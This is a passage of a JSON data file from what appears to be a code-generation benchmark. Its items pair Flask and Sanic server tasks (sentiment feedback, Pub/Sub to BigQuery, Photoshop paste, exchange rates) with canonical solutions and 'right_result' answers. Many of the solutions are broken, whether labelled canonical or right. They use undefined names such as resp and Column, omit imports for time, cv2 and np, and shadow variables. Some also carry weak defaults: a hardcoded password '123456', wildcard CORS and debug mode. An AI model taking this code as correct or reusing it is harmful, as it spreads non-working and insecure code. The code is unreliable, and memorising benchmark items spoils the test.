    "Canonical_solution": "from flask import Flask, request, make_response\nfrom time import sleep\n\napp = Flask(__name__)\n\n@app.route('/respond')\ndef respond():\n    time_to_sleep = int(request.args.get('time')) / 1000\n    sleep(time_to_sleep)\n    resp = make_response('Response from Flask')\n    resp.headers['Access-Control-Allow-Origin'] = '*'\n    return resp\n\n@app.route('/request_type')\ndef request_type():\n    resp = make_response('Request Type: ' + request.method)\n    resp.headers['Access-Control-Allow-Origin'] = '*'\n    return resp\n\n@app.route('/json')\ndef json():\n    return {resp:'Hello JSON!'}",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\n\napp = Flask(__name__)\n\n@app.route('/respond')\ndef respond():\n    time = int(request.args.get('time'))\n    import time\n    time.sleep(time / 1000)\n    return \"Response from Flask\", 200, {'Access-Control-Allow-Origin': '*'}\n\n@app.route('/request_type')\ndef request_type():\n    method = request.method\n    return f\"Request method: {method}\", 200, {'Access-Control-Allow-Origin': '*'}\n\n@app.route('/json')\ndef json():\n    return jsonify({'resp': 'Hello JSON!'}), 200, {'Access-Control-Allow-Origin': '*'}\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)"
  },
  {
    "Task_id": 203,
    "Instruction": "Task Description: Create a Flask-based web application for sentiment analysis of movie reviews that includes classification, user feedback handling, and data persistence.\n\nClass Description: ReviewClassifier is a Flask web application class that performs sentiment analysis on movie reviews using a pre-trained classifier. It handles user submissions, provides classification results, processes feedback, and stores data in an SQLite database.\n\nAttributes:\n- app: Flask - The Flask application instance\n- clf: sklearn classifier - Pre-trained sentiment classifier loaded from pickle file\n- db: str - Path to the SQLite database file for storing reviews\n\nMethods:\n- __init__() -> None - Initializes the Flask app, loads classifier, and sets up routes\n- _setup_routes() -> None - Configures Flask routes for the web application\n- classify(document: str) -> tuple[str, float] - Classifies a review document and returns (label, probability)\n- train(document: str, y: int) -> None - Updates classifier with new training data\n- sqlite_entry(document: str, y: int) -> None - Stores review and sentiment in database\n- index() -> str - Renders the main review submission form (HTML)\n- results() -> str - Processes form submission and renders classification results (HTML)\n- feedback() -> str - Handles user feedback and updates model/database (HTML)\n- run(debug: bool = True) -> None - Starts the Flask development server",
    "Canonical_solution": "from flask import Flask, request, render_template\nfrom wtforms import Form, TextAreaField, validators\nimport pickle\nimport sqlite3\nimport os\nimport numpy as np\nfrom vectorizer import vect\n\nclass ReviewClassifier:\n    def __init__(self):\n        self.app = Flask(__name__)\n        cur_dir = os.path.dirname(__file__)\n        self.clf = pickle.load(open(os.path.join(cur_dir, 'pkl_objects', 'classifier.pkl'), 'rb'))\n        self.db = os.path.join(cur_dir, 'reviews.sqlite')\n        self._setup_routes()\n\n    def _setup_routes(self):\n        self.app.route('/')(self.index)\n        self.app.route('/results', methods=['POST'])(self.results)\n        self.app.route('/thanks', methods=['POST'])(self.feedback)\n\n    def classify(self, document):\n        label = {0: 'negative', 1: 'positive'}\n        X = vect.transform([document])\n        y = self.clf.predict(X)[0]\n        proba = np.max(self.clf.predict_proba(X))\n        return label[y], proba\n\n    def train(self, document, y):\n        X = vect.transform([document])\n        self.clf.partial_fit(X, [y])\n\n    def sqlite_entry(self, document, y):\n        conn = sqlite3.connect(self.db)\n        c = conn.cursor()\n        c.execute(\"INSERT INTO review_db (review, sentiment, date) VALUES (?, ?, DATETIME('now'))\", (document, y))\n        conn.commit()\n        conn.close()\n\n    def index(self):\n        form = ReviewForm(request.form)\n        return render_template('reviewform.html', form=form)\n\n    def results(self):\n        form = ReviewForm(request.form)\n        if request.method == 'POST' and form.validate():\n            review = request.form['moviereview']\n            y, proba = self.classify(review)\n            return render_template('results.html',\n                                  content=review,\n                                  prediction=y,\n                                  probability=round(proba*100, 2))\n        return render_template('reviewform.html', form=form)\n\n    def feedback(self):\n        feedback = request.form['feedback_button']\n        review = request.form['review']\n        prediction = request.form['prediction']\n\n        inv_label = {'negative': 0, 'positive': 1}\n        y = inv_label[prediction]\n        if feedback == 'Incorrect':\n            y = int(not(y))\n        self.train(review, y)\n        self.sqlite_entry(review, y)\n        return render_template('thanks.html')\n\n    def run(self, debug=True):\n        self.app.run(debug=debug)\n\nclass ReviewForm(Form):\n    moviereview = TextAreaField('',\n                              [validators.DataRequired(),\n                               validators.length(min=15)])",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, render_template, redirect, url_for\nimport sqlite3\nfrom sklearn.ensemble import RandomForestClassifier\nimport pickle\nimport numpy as np\n\nclass ReviewClassifier:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self.clf = self._load_classifier()\n        self.db = 'reviews.db'\n        self._setup_routes()\n    \n    def _load_classifier(self):\n        with open('sentiment_model.pkl', 'rb') as f:\n            return pickle.load(f)\n    \n    def _setup_routes(self):\n        self.app.route('/')(self.index)\n        self.app.route('/results', methods=['POST'])(self.results)\n        self.app.route('/feedback', methods=['POST'])(self.feedback)\n    \n    def classify(self, document: str) -> tuple[str, float]:\n        proba = self.clf.predict_proba([document])[0]\n        return self.clf.classes_[np.argmax(proba)], proba[np.argmax(proba)]\n    \n    def train(self, document: str, y: int) -> None:\n        X = [document]\n        y = [y]\n        self.clf.partial_fit(np.array(X), np.array(y))\n    \n    def sqlite_entry(self, document: str, y: int) -> None:\n        conn = sqlite3.connect(self.db)\n        c = conn.cursor()\n        c.execute('''CREATE TABLE IF NOT EXISTS reviews\n                     (id INTEGER PRIMARY KEY AUTOINCREMENT,\n                      text TEXT NOT NULL,\n                      sentiment INTEGER NOT NULL)''')\n        c.execute(\"INSERT INTO reviews (text, sentiment) VALUES (?, ?)\", (document, y))\n        conn.commit()\n        conn.close()\n    \n    def index(self) -> str:\n        return render_template('index.html')\n    \n    def results(self) -> str:\n        document = request.form['review']\n        label, prob = self.classify(document)\n        return render_template('results.html', review=document, label=label, prob=prob)\n    \n    def feedback(self) -> str:\n        document = request.form['review']\n        y = int(request.form['sentiment'])\n        self.sqlite_entry(document, y)\n        return redirect(url_for('index'))\n    \n    def run(self, debug: bool = True) -> None:\n        self.app.run(debug=debug)"
  },
  {
    "Task_id": 204,
    "Instruction": "Task Description: Create a simple HTTP server using Flask that handles GET requests on a specific endpoint and returns a response.\n\nFunction Description: The function `server_request` is a Flask route handler that processes incoming GET requests to the \"/server_request\" endpoint. It retrieves a query parameter named \"param\" from the request, prints it to the console, and returns a simple response string \"served\".\n\nInput: \n- The function receives an implicit Flask `request` object containing the HTTP request data.\n- The input parameter is passed as a query string parameter named \"param\" (e.g., \"/server_request?param=value\").\n\nOutput: \n- The function prints the value of the \"param\" query parameter to the console.\n- The function returns a string response \"served\" with HTTP status code 200.",
    "Canonical_solution": "from flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route(\"/server_request\")\ndef server_request():\n    print(request.args.get(\"param\"))\n    return \"served\"\n\nif __name__ == \"__main__\":\n    app.run(port=8082)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/server_request')\ndef server_request():\n    param = request.args.get('param')\n    print(param)\n    return 'served', 200\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 205,
    "Instruction": "Task Description: Create a Flask-based HTTP server endpoint that processes Pub/Sub push subscription messages, extracts relevant data, and inserts it into BigQuery. Handle errors gracefully and return appropriate HTTP responses.\n\nFunction Description: The function serves as a Flask route handler for POST requests at the root path (\"/\"). It processes incoming Pub/Sub messages, extracts attributes and message data, processes Cloud Build events if present, and inserts the processed data into BigQuery. Errors are logged and a 204 No Content response is returned upon successful processing.\n\nInput: \n- HTTP POST request with JSON payload containing Pub/Sub message format:\n  {\n    \"message\": {\n      \"attributes\": {\n        \"key1\": \"value1\",\n        \"buildId\": \"123\" (optional)\n      },\n      \"data\": \"base64-encoded-string\" (optional)\n    }\n  }\n\nOutput: \n- Returns HTTP 204 No Content response on successful processing\n- Raises exceptions for invalid payload formats or missing required fields\n- Logs errors to console when data cannot be saved to BigQuery",
    "Canonical_solution": "import base64\nimport os\nimport json\nimport shared\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route(\"/\", methods=[\"POST\"])\ndef index():\n    \"\"\"\n    Receives messages from a push subscription from Pub/Sub.\n    Parses the message, and inserts it into BigQuery.\n    \"\"\"\n    event = None\n    if not request.is_json:\n        raise Exception(\"Expecting JSON payload\")\n    envelope = request.get_json()\n\n    if \"message\" not in envelope:\n        raise Exception(\"Not a valid Pub/Sub Message\")\n    msg = envelope[\"message\"]\n\n    if \"attributes\" not in msg:\n        raise Exception(\"Missing pubsub attributes\")\n\n    try:\n        attr = msg[\"attributes\"]\n        if \"buildId\" in attr:\n            event = process_cloud_build_event(attr, msg)\n\n        shared.insert_row_into_bigquery(event)\n\n    except Exception as e:\n        entry = {\n                \"severity\": \"WARNING\",\n                \"msg\": \"Data not saved to BigQuery\",\n                \"errors\": str(e),\n                \"json_payload\": envelope\n            }\n        print(json.dumps(entry))\n\n    return \"\", 204",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, Response\nimport base64\nimport logging\nfrom google.cloud import bigquery\n\napp = Flask(__name__)\nlogging.basicConfig(level=logging.INFO)\n\ndef insert_into_bigquery(project_id, dataset_id, table_id, data):\n    client = bigquery.Client(project=project_id)\n    dataset_ref = client.dataset(dataset_id)\n    table_ref = dataset_ref.table(table_id)\n    job_config = bigquery.LoadJobConfig(\n        source_format=bigquery.SourceFormat.NEWLINE_DELIMITED_JSON,\n        write_disposition=bigquery.WriteDisposition.WRITE_TRUNCATE\n    )\n    uri = \"gs://your-bucket-path/your-file.json\"\n    load_job = client.load_table_from_uri(\n        uri, table_ref, job_config=job_config\n    )\n    load_job.result()\n    logging.info(\"Loaded {} rows into {}\".format(load_job.output_rows, table_ref))\n\n@app.route('/', methods=['POST'])\ndef process_pubsub_message():\n    try:\n        data = request.get_json()\n        if not data or 'message' not in data:\n            logging.error(\"Missing 'message' field in payload\")\n            return Response(status=400)\n\n        message = data['message']\n        if 'attributes' not in message:\n            logging.error(\"Missing 'attributes' field in message\")\n            return Response(status=400)\n\n        attributes = message['attributes']\n        build_id = attributes.get('buildId')\n        key1 = attributes.get('key1')\n\n        data_field = message.get('data')\n        if data_field:\n            try:\n                data_decoded = base64.b64decode(data_field).decode('utf-8')\n            except Exception as e:\n                logging.error(\"Error decoding data: {}\".format(e))\n                return Response(status=500)\n        else:\n            data_decoded = \"\"\n\n        if build_id:\n            # Process Cloud Build event\n            logging.info(\"Processing Cloud Build event with ID: {}\".format(build_id))\n        else:\n            logging.info(\"No Cloud Build event detected\")\n\n        # Example BigQuery insertion\n        project_id = \"your-project-id\"\n        dataset_id = \"your-dataset-id\"\n        table_id = \"your-table-id\"\n        insert_into_bigquery(project_id, dataset_id, table_id, {\n            \"key1\": key1,\n            \"buildId\": build_id,\n            \"data\": data_decoded\n        })\n\n        logging.info(\"Message processed successfully\")\n        return Response(status=204)\n\n    except Exception as e:\n        logging.error(\"Error processing message: {}\".format(e))\n        return Response(status=500)\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=8080)"
  },
  {
    "Task_id": 206,
    "Instruction": "Task Description: Create a Flask-based HTTP server endpoint that handles image pasting functionality, including image processing, screen projection detection, and integration with Photoshop.\n\nFunction Description: The paste() function handles POST requests to the '/paste' endpoint. It receives an image file, processes it to find matching screen coordinates, and sends it to Photoshop at the detected location. The function includes error handling, logging, and returns appropriate JSON responses.\n\nInput:\n- HTTP POST request containing:\n  - 'data' file: [binary] - Image file to be processed and pasted\n- Optional command line argument:\n  - '--photoshop_password': [str] - Password for Photoshop integration (default: '123456')\n\nOutput:\n- JSON response containing:\n  - 'status': [str] - Operation result ('ok', 'error', or 'screen not found')\n  - Optional 'error': [str] - Error description if status is 'error'\n- Possible HTTP status codes:\n  - 200: Successful operation\n  - 400: Bad request (missing file or empty image)",
    "Canonical_solution": "import io\nimport os\nfrom flask import Flask, request, jsonify, send_file\nfrom flask_cors import CORS\nimport logging\nimport argparse\nimport ps\n\nlogging.basicConfig(level=logging.INFO)\n\nparser = argparse.ArgumentParser()\nparser.add_argument('--photoshop_password', default='123456')\nargs = parser.parse_args()\n\napp = Flask(__name__)\nCORS(app)\n\n@app.route('/paste', methods=['POST'])\ndef paste():\n    start = time.time()\n    logging.info(' PASTE')\n\n    if 'data' not in request.files:\n        return jsonify({\n            'status': 'error',\n            'error': 'missing file param `data`'\n        }), 400\n    data = request.files['data'].read()\n    if len(data) == 0:\n        return jsonify({'status:': 'error', 'error': 'empty image'}), 400\n\n    with open('paste_received.jpg', 'wb') as f:\n        f.write(data)\n\n    view = Image.open(io.BytesIO(data))\n\n    if view.size[0] > max_view_size or view.size[1] > max_view_size:\n        view.thumbnail((max_view_size, max_view_size))\n\n    logging.info(' > grabbing screenshot...')\n    screen = pyscreenshot.grab()\n    screen_width, screen_height = screen.size\n\n    if screen.size[0] > max_screenshot_size or screen.size[1] > max_screenshot_size:\n        screen.thumbnail((max_screenshot_size, max_screenshot_size))\n\n    logging.info(' > finding projected point...')\n    view_arr = np.array(view.convert('L'))\n    screen_arr = np.array(screen.convert('L'))\n    x, y = screenpoint.project(view_arr, screen_arr, False)\n\n    found = x != -1 and y != -1\n\n    if found:\n        x = int(x / screen.size[0] * screen_width)\n        y = int(y / screen.size[1] * screen_height)\n        logging.info(f'{x}, {y}')\n\n        logging.info(' > sending to photoshop...')\n        name = datetime.today().strftime('%Y-%m-%d-%H:%M:%S')\n        img_path = os.path.join(os.getcwd(), 'cut_current.png')\n        err = ps.paste(img_path, name, x, y, password=args.photoshop_password)\n        if err is not None:\n            logging.error('error sending to photoshop')\n            logging.error(err)\n            jsonify({'status': 'error sending to photoshop'})\n    else:\n        logging.info('screen not found')\n\n    logging.info(f'Completed in {time.time() - start:.2f}s')\n\n    if found:\n        return jsonify({'status': 'ok'})\n    else:\n        return jsonify({'status': 'screen not found'})",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\nimport logging\nimport os\nimport base64\nimport subprocess\nfrom PIL import Image\nimport numpy as np\n\napp = Flask(__name__)\nlogging.basicConfig(level=logging.INFO)\n\ndef process_image(image_data):\n    try:\n        # Decode image data\n        nparr = np.frombuffer(image_data, np.uint8)\n        img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)\n        \n        # Simple screen projection detection (example logic)\n        # In a real scenario, this would involve more complex image processing\n        # For demonstration, we'll assume the image is correctly aligned\n        # and return a mock coordinate\n        x, y = 100, 100\n        \n        # Call Photoshop with the image data and coordinates\n        ps_password = os.getenv('PHOTOSHOP_PASSWORD', '123456')\n        command = [\n            'photoshop',\n            '-batch',\n            f'-password {ps_password}',\n            '-script',\n            'paste_script.jsx',\n            '-param',\n            f'x={x},y={y}',\n            '-data',\n            base64.b64encode(image_data).decode()\n        ]\n        subprocess.run(command, check=True)\n        \n        return {'status': 'ok'}\n    \n    except Exception as e:\n        logging.error(f\"Error processing image: {str(e)}\")\n        return {'status': 'error', 'error': str(e)}\n\n@app.route('/paste', methods=['POST'])\ndef paste():\n    if 'data' not in request.files:\n        return jsonify({'status': 'error', 'error': 'Missing image file'}), 400\n    \n    image_file = request.files['data']\n    if image_file.filename == '':\n        return jsonify({'status': 'error', 'error': 'No selected file'}), 400\n    \n    if image_file.content_length == 0:\n        return jsonify({'status': 'error', 'error': 'Empty image file'}), 400\n    \n    try:\n        image_data = image_file.read()\n        result = process_image(image_data)\n        return jsonify(result), 200\n    \n    except Exception as e:\n        return jsonify({'status': 'error', 'error': str(e)}), 500\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)"
  },
  {
    "Task_id": 207,
    "Instruction": "Task Description: Create a Flask-based HTTP server with multiple endpoints to handle different types of requests, including delayed responses, request type identification, and JSON responses.\n\nFunction Description: The code implements three Flask route handlers that demonstrate different HTTP server functionalities. Each function handles a specific endpoint and performs a distinct operation.\n\nInput:\n- For '/respond' endpoint: \n  - Query parameter 'time' (integer): Milliseconds to sleep before responding\n- For '/request_type' endpoint: \n  - None (implicitly receives HTTP request method)\n- For '/json' endpoint: \n  - None\n\nOutput:\n- For '/respond' endpoint: \n  - HTTP response with text body after specified delay\n  - Sets CORS header to allow all origins\n- For '/request_type' endpoint: \n  - HTTP response indicating the request method type\n  - Sets CORS header to allow all origins\n- For '/json' endpoint: \n  - Automatic JSON response with greeting message",
    "Canonical_solution": "from flask import Flask, request, make_response\nfrom time import sleep\n\napp = Flask(__name__)\n\n@app.route('/respond')\ndef respond():\n    time_to_sleep = int(request.args.get('time')) / 1000\n    sleep(time_to_sleep)\n    resp = make_response('Response from Flask')\n    resp.headers['Access-Control-Allow-Origin'] = '*'\n    return resp\n\n@app.route('/request_type')\ndef request_type():\n    resp = make_response('Request Type: ' + request.method)\n    resp.headers['Access-Control-Allow-Origin'] = '*'\n    return resp\n\n@app.route('/json')\ndef json():\n    return {resp:'Hello JSON!'}",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\nimport time\nimport json\n\napp = Flask(__name__)\n\n@app.route('/respond')\ndef respond():\n    time_ms = int(request.args.get('time', 0))\n    time.sleep(time_ms / 1000)\n    return 'Response after {}ms'.format(time_ms), 200, {'Access-Control-Allow-Origin': '*'}\n\n@app.route('/request_type')\ndef request_type():\n    method = request.method\n    return f'Request method: {method}', 200, {'Access-Control-Allow-Origin': '*'}\n\n@app.route('/json')\ndef json_response():\n    data = {'greeting': 'Hello from JSON endpoint'}\n    return jsonify(data), 200, {'Access-Control-Allow-Origin': '*'}\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)"
  },
  {
    "Task_id": 210,
    "Instruction": "Task Description: Create a Python application using Sanic framework that serves a basic web page and integrates a ReactPy component. The application should have a root route serving an HTML file and a separate route prefix for ReactPy components.\n\nFunction Description: The code sets up a Sanic web server with two main functionalities: serving static content (index.html) and hosting ReactPy components. It demonstrates basic route handling and ReactPy integration with Sanic.\n\nInput: None (The functions don't take explicit parameters but rely on framework-specific objects)\n\nOutput: A running Sanic web server that responds to HTTP requests\n\nMethods:\n\nconfigure_reactpy: None -> None - Configures the ReactPy integration with Sanic, setting up the necessary routes and options for ReactPy components under the \"/_reactpy\" prefix.\n\nrun_server: None -> None - Starts the Sanic web server on localhost (127.0.0.1) port 5000.\n\nRoute Handlers:\n\nindex: (request: sanic.Request) -> sanic.response.HTTPResponse - Asynchronous route handler for the root path (\"/\") that serves the index.html file.\n\nReactPyView: None -> reactpy.types.Component - ReactPy component function that returns basic HTML content to be rendered by the ReactPy backend.",
    "Canonical_solution": "from sanic import Sanic\nfrom sanic.response import file\nfrom reactpy import component, html\nfrom reactpy.backend.sanic import Options, configure\n\napp = Sanic(\"MyApp\")\n\n@app.route(\"/\")\nasync def index(request):\n    return await file(\"index.html\")\n\n@component\ndef ReactPyView():\n    return html.code(\"This text came from an ReactPy App\")\n\ndef configure_reactpy():\n    configure(app, ReactPyView, Options(url_prefix=\"/_reactpy\"))\n\ndef run_server():\n    app.run(host=\"127.0.0.1\", port=5000)\n\nif __name__ == \"__main__\":\n    configure_reactpy()\n    run_server()",
    "Code_level": "Function-level",
    "FSMID_for_test": 62,
    "right_result": "import sanic\nfrom sanic import response\nfrom reactpy import component, use_state\nimport asyncio\n\napp = sanic.Sanic(__name__)\n\n@component\ndef ReactPyView():\n    count, set_count = use_state(0)\n    return \"\"\"\n        <div>\n            <h1>ReactPy Component</h1>\n            <p>You clicked {count} times</p>\n            <button onClick={() => set_count(count + 1)}>Click me</button>\n        </div>\n    \"\"\".format(count=count)\n\n@app.route('/')\nasync def index(request):\n    return response.file('index.html')\n\n@app.route('/_reactpy')\ndef reactpy_route(request):\n    return response.html(ReactPyView())\n\ndef configure_reactpy():\n    app.config.REACTPY_ROUTE_PREFIX = '/_reactpy'\n\ndef run_server():\n    app.run(host='127.0.0.1', port=5000)"
  },
  {
    "Task_id": 211,
    "Instruction": "Task Description: Create a Sanic-based HTTP server for handling text embedding requests using an ONNX backend, with configurable GPU usage and worker processes.\n\nFunction Description: The function `setup_embedding_server` initializes and runs a Sanic web server that provides an embedding service. It sets up a single POST endpoint `/embedding` that processes text inputs and returns their embeddings using an ONNX-based backend. The server can be configured to use GPU acceleration and multiple worker processes.\n\nInput:\n- `use_gpu`: [Boolean] - Optional flag indicating whether to use GPU acceleration (default: False)\n- `workers`: [Integer] - Optional number of worker processes to spawn (default: 1)\n\nOutput:\n- None (The function runs indefinitely as a web server)\n- The server responds to POST requests at `/embedding` with JSON-formatted embedding results",
    "Canonical_solution": "import sys\nimport os\nfrom sanic import Sanic\nfrom sanic.response import json\nfrom qanything_kernel.dependent_server.embedding_server.embedding_onnx_backend import EmbeddingOnnxBackend\nimport argparse\n\ndef setup_embedding_server(use_gpu=False, workers=1):\n    app = Sanic(\"embedding_server\")\n\n    @app.route(\"/embedding\", methods=[\"POST\"])\n    async def embedding(request):\n        data = request.json\n        texts = data.get('texts')\n        onnx_backend: EmbeddingOnnxBackend = request.app.ctx.onnx_backend\n        result_data = onnx_backend.predict(texts)\n        return json(result_data)\n\n    @app.listener('before_server_start')\n    async def setup_onnx_backend(app, loop):\n        app.ctx.onnx_backend = EmbeddingOnnxBackend(use_cpu=not use_gpu)\n\n    app.run(host=\"0.0.0.0\", port=9001, workers=workers)\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser()\n    parser.add_argument('--use_gpu', action=\"store_true\", help='use gpu or not')\n    parser.add_argument('--workers', type=int, default=1, help='workers')\n    args = parser.parse_args()\n    setup_embedding_server(use_gpu=args.use_gpu, workers=args.workers)",
    "Code_level": "Function-level",
    "FSMID_for_test": 62,
    "right_result": "import sanic\nfrom sanic import response, Blueprint\nimport onnxruntime as ort\nimport json\nimport os\n\nclass EmbeddingServer:\n    def __init__(self, model_path, use_gpu=False):\n        self.model_path = model_path\n        self.use_gpu = use_gpu\n        self.session = self._create_session()\n    \n    def _create_session(self):\n        providers = []\n        if self.use_gpu:\n            providers = ['CUDAExecutionProvider']\n        return ort.InferenceSession(self.model_path, providers=providers)\n    \n    async def embed_text(self, text):\n        inputs = {self.session.get_inputs()[0].name: ort.OrtValue.CreateFrom_numpy(np.array([text]))}\n        outputs = self.session.run(None, inputs)\n        return outputs[0].numpy().tolist()\n\ndef setup_embedding_server(model_path, use_gpu=False, workers=1):\n    app = sanic.Sanic(\"EmbeddingServer\")\n    bp = Blueprint(\"embedding\", url_prefix=\"/\")\n    \n    server = EmbeddingServer(model_path, use_gpu)\n    \n    @bp.route(\"/embedding\", methods=[\"POST\"])\n    async def embedding(request):\n        data = request.json\n        text = data.get(\"text\")\n        if not text:\n            return response.json({\"error\": \"No text provided\"}, status=400)\n        try:\n            embedding = server.embed_text(text)\n            return response.json({\"embedding\": embedding}, status=200)\n        except Exception as e:\n            return response.json({\"error\": str(e)}, status=500)\n    \n    app.blueprint(bp)\n    \n    if workers > 1:\n        app.run(host=\"0.0.0.0\", port=8000, workers=workers, access_log=False)\n    else:\n        app.run(host=\"0.0.0.0\", port=8000, access_log=False)"
  },
  {
    "Task_id": 212,
    "Instruction": "Task Description: Create a Sanic-based HTTP server for handling exchange rate API requests, supporting date-based queries, base currency conversion, and symbol filtering.\n\nClass Description: ExchangeRateAPI is a Sanic application that provides exchange rate data from a PostgreSQL database. It handles various API endpoints for retrieving latest rates or rates for specific dates, with support for currency conversion and symbol filtering.\n\nAttributes:\n- app: Sanic - The Sanic application instance\n- db: Gino - Database connection handler using Gino ORM\n- config: dict - Application configuration parsed from DATABASE_URL environment variable\n\nMethods:\n- __init__() -> None - Initializes the Sanic app, database connection, and sets up routes\n- _setup_routes() -> None - Defines all API routes and their handlers\n- run(host: str = \"0.0.0.0\", port: int = 8000) -> None - Starts the Sanic server with specified host and port\n\nRoute Handlers:\n- exchange_rates(request: Request, date: str = None) -> HTTPResponse - Handles all exchange rate API requests:\n  * Input: \n    - request: Sanic Request object containing query parameters\n    - date: Optional date string in YYYY-MM-DD format\n  * Output: JSON response containing:\n    - base currency\n    - date of rates\n    - exchange rates\n    OR error message with appropriate HTTP status code\n\nSupporting Class:\nExchangeRates: Gino model representing exchange rate data\nAttributes:\n- date: date - The date of the exchange rates\n- rates: dict - Dictionary of currency rates",
    "Canonical_solution": "import fcntl\nimport itertools\nimport requests\nfrom datetime import datetime\nfrom decimal import Decimal\nfrom os import getenv\nfrom xml.etree import ElementTree\nfrom sanic import Sanic\nfrom sanic.response import json, redirect\nfrom exchangerates.utils import Gino, cors, parse_database_url\n\nclass ExchangeRateAPI:\n    def __init__(self):\n        self.app = Sanic()\n        self.app.config.update(\n            parse_database_url(\n                url=getenv(\"DATABASE_URL\", \"postgresql://localhost/exchangerates\")\n            )\n        )\n        self.db = Gino(self.app)\n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.app.route(\"/latest\", methods=[\"GET\", \"HEAD\"])\n        @self.app.route(\"/<date>\", methods=[\"GET\", \"HEAD\"])\n        @self.app.route(\"/api/latest\", methods=[\"GET\", \"HEAD\"])\n        @self.app.route(\"/api/<date>\", methods=[\"GET\", \"HEAD\"])\n        @cors()\n        async def exchange_rates(request, date=None):\n            if request.method == \"HEAD\":\n                return json(\"\")\n\n            dt = datetime.now()\n            if date:\n                try:\n                    dt = datetime.strptime(date, \"%Y-%m-%d\")\n                except ValueError as e:\n                    return json({\"error\": \"{}\".format(e)}, status=400)\n\n                if dt < datetime(1999, 1, 4):\n                    return json(\n                        {\"error\": \"There is no data for dates older then 1999-01-04.\"},\n                        status=400,\n                    )\n\n            exchange_rates = (\n                await ExchangeRates.query.where(ExchangeRates.date <= dt.date())\n                .order_by(ExchangeRates.date.desc())\n                .gino.first()\n            )\n            rates = exchange_rates.rates\n\n            base = \"EUR\"\n            if \"base\" in request.raw_args and request.raw_args[\"base\"] != \"EUR\":\n                base = request.raw_args[\"base\"]\n                if base in rates:\n                    base_rate = Decimal(rates[base])\n                    rates = {\n                        currency: Decimal(rate) / base_rate for currency, rate in rates.items()\n                    }\n                    rates[\"EUR\"] = Decimal(1) / base_rate\n                else:\n                    return json(\n                        {\"error\": \"Base '{}' is not supported.\".format(base)}, status=400\n                    )\n\n            if \"symbols\" in request.args:\n                symbols = list(\n                    itertools.chain.from_iterable(\n                        [symbol.split(\",\") for symbol in request.args[\"symbols\"]]\n                    )\n                )\n                if all(symbol in rates for symbol in symbols):\n                    rates = {symbol: rates[symbol] for symbol in symbols}\n                else:\n                    return json(\n                        {\n                            \"error\": \"Symbols '{}' are invalid for date {}.\".format(\n                                \",\".join(symbols), dt.date()\n                            )\n                        },\n                        status=400,\n                    )\n\n            return json(\n                {\"base\": base, \"date\": exchange_rates.date.strftime(\"%Y-%m-%d\"), \"rates\": rates}\n            )\n\n    def run(self, host=\"0.0.0.0\", port=8000):\n        self.app.run(host=host, port=port, access_log=False, debug=True)\n\nclass ExchangeRates:\n    __tablename__ = \"exchange_rates\"\n    date = None\n    rates = None",
    "Code_level": "Class-level",
    "FSMID_for_test": 62,
    "right_result": "from sanic import Sanic\nfrom sanic.views import HTTPMethodView\nfrom sanic.response import json\nfrom gino import Gino\nfrom datetime import date\nimport os\nimport re\n\nDATABASE_URL = os.getenv('DATABASE_URL')\n\nclass ExchangeRates:\n    __tablename__ = 'exchange_rates'\n\n    id = Column(Integer, primary_key=True)\n    date = Column(Date, index=True)\n    base = Column(String(3), nullable=False)\n    rates = Column(JSON, nullable=False)\n\nclass ExchangeRateAPI(Sanic):\n    def __init__(self):\n        super().__init__()\n        self.app = Sanic(__name__)\n        self.db = Gino()\n        self.config = {\n            'DATABASE_URL': DATABASE_URL\n        }\n        self._setup_routes()\n\n    async def _setup_routes(self):\n        self.app.route('/exchange-rates')(self.exchange_rates)\n        self.app.route('/exchange-rates/<date:\u65e5\u671f>')(self.exchange_rates)\n\n    async def exchange_rates(self, request, date=None):\n        try:\n            if date is None:\n                date = date.today().strftime('%Y-%m-%d')\n            else:\n                date = date.strip()\n                if re.match(r'^\\d{4}-\\d{2}-\\d{2}$', date):\n                    pass\n                else:\n                    return json({'error': 'Invalid date format'}, status=400)\n            date_obj = date.strptime(date, '%Y-%m-%d')\n        except ValueError:\n            return json({'error': 'Invalid date format'}, status=400)\n\n        query = await self.db.get(ExchangeRates, date=date_obj)\n        if not query:\n            return json({'error': 'No exchange rates found for the given date'}, status=404)\n\n        rates = query.rates\n        base = query.base\n        return json({\n            'base': base,\n            'date': date_obj.strftime('%Y-%m-%d'),\n            'rates': rates\n        })\n\n    def run(self, host=\"0.0.0.0\", port=8000):\n        self.app.config['HOST'] = host\n        self.app.config['PORT'] = port\n        self.app.run(host=host, port=port)\n\nif __name__ == '__main__':\n    app = ExchangeRateAPI()\n    app.run()"
  },
  {
    "Task_id": 213,
